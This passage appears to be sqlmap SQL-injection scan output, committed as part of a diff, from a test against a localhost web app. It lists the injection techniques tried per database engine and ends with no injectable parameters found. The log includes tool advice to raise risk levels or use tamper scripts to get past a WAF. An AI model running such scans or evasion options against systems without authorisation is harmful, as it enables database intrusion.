+[05:23:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[05:23:53] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[05:23:53] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[05:23:53] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[05:23:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[05:23:54] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:54] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[05:23:54] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[05:23:54] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[05:23:55] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[05:23:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[05:23:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
+[05:23:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
+[05:23:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[05:23:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[05:23:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[05:23:55] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+[05:23:56] [INFO] testing 'MonetDB AND error-based - WHERE or HAVING clause'
+[05:23:56] [INFO] testing 'Vertica AND error-based - WHERE or HAVING clause'
+[05:23:56] [INFO] testing 'IBM DB2 AND error-based - WHERE or HAVING clause'
+[05:23:56] [INFO] testing 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[05:23:56] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:56] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[05:23:56] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[05:23:56] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[05:23:56] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
+[05:23:56] [INFO] testing 'Oracle error-based - Parameter replace'
+[05:23:56] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
+[05:23:56] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
+[05:23:56] [INFO] testing 'PostgreSQL error-based - ORDER BY, GROUP BY clause'
+[05:23:56] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
+[05:23:56] [INFO] testing 'Generic inline queries'
+[05:23:56] [INFO] testing 'MySQL inline queries'
+[05:23:56] [INFO] testing 'PostgreSQL inline queries'
+[05:23:56] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[05:23:56] [INFO] testing 'Oracle inline queries'
+[05:23:56] [INFO] testing 'SQLite inline queries'
+[05:23:56] [INFO] testing 'Firebird inline queries'
+[05:23:56] [INFO] testing 'ClickHouse inline queries'
+[05:23:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[05:23:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[05:23:56] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[05:23:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[05:23:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[05:23:57] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[05:23:57] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[05:23:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[05:23:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'
+[05:23:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[05:23:57] [INFO] testing 'Oracle stacked queries (heavy query - comment)'
+[05:23:57] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'
+[05:23:57] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[05:23:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[05:23:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[05:23:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[05:23:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[05:23:57] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[05:23:57] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[05:23:57] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[05:23:57] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[05:23:57] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[05:23:58] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[05:23:58] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[05:23:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[05:23:58] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'
+[05:23:58] [INFO] testing 'Oracle AND time-based blind'
+[05:23:58] [INFO] testing 'Oracle AND time-based blind (heavy query)'
+[05:23:58] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'
+[05:23:58] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[05:23:58] [INFO] testing 'Informix AND time-based blind (heavy query)'
+[05:23:58] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[05:23:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[05:23:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[05:23:58] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[05:23:58] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
+[05:23:58] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:58] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[05:23:58] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
+[05:23:58] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
+[05:23:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[05:23:59] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
+[05:23:59] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[05:23:59] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[05:23:59] [WARNING] parameter 'Referer' does not seem to be injectable
+[05:23:59] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. You can give it a go with the switch '--text-only' if the target page has a low percentage of textual content (~100.00% of page content is text). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next target
+[05:23:59] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 1559 times
+[05:23:59] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-06252025_0523am.csv'
+
+[*] ending @ 05:23:59 /2025-06-25/
+
+
+================================================================================
+VULNERABLE: http://localhost:9000/vendor.js
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:24:01 /2025-06-25/
+
+[05:24:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[05:24:01] [INFO] starting crawler for target URL 'http://localhost:9000/vendor.js'
+[05:24:01] [INFO] searching for links with depth 1
+[05:24:03] [WARNING] no usable links found (with GET parameters)
+
+[*] ending @ 05:24:03 /2025-06-25/
+
+
